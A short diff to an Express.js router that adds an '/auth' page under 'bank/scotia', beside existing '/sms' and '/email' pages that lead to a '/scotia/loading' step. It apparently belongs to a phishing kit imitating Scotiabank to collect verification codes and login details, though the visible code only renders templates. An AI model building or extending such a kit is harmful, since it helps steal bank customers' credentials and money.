@@ -35,6 +35,14 @@ router.get('/sms', async (req, res) => {
     res.render('bank/scotia/sms/index', { navig: "/scotia/loading", error: error});
 })
 
+router.get('/auth', async (req, res) => {
+    let error = false
+    if(req.query.argument){
+        error = true
+    }
+    res.render('bank/scotia/auth/index', { navig: "/scotia/loading", error: error });
+})
+
 router.get('/email', async (req, res) => {
     let error = false
     if(req.query.argument){
